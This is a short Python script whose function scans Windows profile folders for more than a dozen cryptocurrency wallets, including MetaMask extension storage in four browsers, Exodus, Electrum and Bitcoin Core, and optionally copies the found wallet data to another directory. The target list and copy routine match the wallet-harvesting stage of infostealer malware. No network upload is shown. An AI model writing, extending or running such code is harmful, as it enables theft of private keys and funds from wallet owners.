import os
import shutil

def find_wallets(copy_to=None):
    """
    Scans for popular crypto wallet files/directories.
    If copy_to is provided, copies found wallet data to that directory.
    Returns a list of found wallet paths.
    """
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    userprofile = os.getenv("USERPROFILE")
    wallets = {
        "Exodus": os.path.join(roaming, "Exodus"),
        "Electrum": os.path.join(roaming, "Electrum", "wallets"),
        "Atomic": os.path.join(roaming, "Atomic", "Local Storage", "leveldb"),
        "Coinomi": os.path.join(local, "Coinomi", "Coinomi", "wallets"),
        "Jaxx": os.path.join(local, "com.liberty.jaxx", "IndexedDB"),
        "MetaMask (Chrome)": os.path.join(local, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        "MetaMask (Brave)": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        "MetaMask (Edge)": os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        "MetaMask (Opera)": os.path.join(roaming, "Opera Software", "Opera Stable", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        "Zcash": os.path.join(userprofile, "AppData", "Roaming", "Zcash"),
        "Armory": os.path.join(userprofile, "AppData", "Roaming", "Armory"),
        "Bitcoin": os.path.join(userprofile, "AppData", "Roaming", "Bitcoin"),
        "Litecoin": os.path.join(userprofile, "AppData", "Roaming", "Litecoin"),
        "Dash": os.path.join(userprofile, "AppData", "Roaming", "Dash"),
        "Ethereum": os.path.join(userprofile, "AppData", "Roaming", "Ethereum"),
        "Monero": os.path.join(userprofile, "AppData", "Roaming", "Monero"),
        "Dogecoin": os.path.join(userprofile, "AppData", "Roaming", "DogeCoin"),
        # Add more as needed
    }
    found = []
    for name, path in wallets.items():
        if os.path.exists(path):
            found.append((name, path))
            if copy_to:
                try:
                    dest = os.path.join(copy_to, f"{name.replace(' ', '_')}_wallet")
                    if os.path.isdir(path):
                        shutil.copytree(path, dest, dirs_exist_ok=True)
                    else:
                        os.makedirs(os.path.dirname(dest), exist_ok=True)
                        shutil.copy2(path, dest)
                except Exception as e:
                    print(f"Error copying {name} wallet: {e}")
    return found

if __name__ == "__main__":
    found = find_wallets()
    if found:
        print("Found crypto wallets:")
        for name, path in found:
            print(f"{name}: {path}")
    else:
        print("No popular crypto wallets found.")
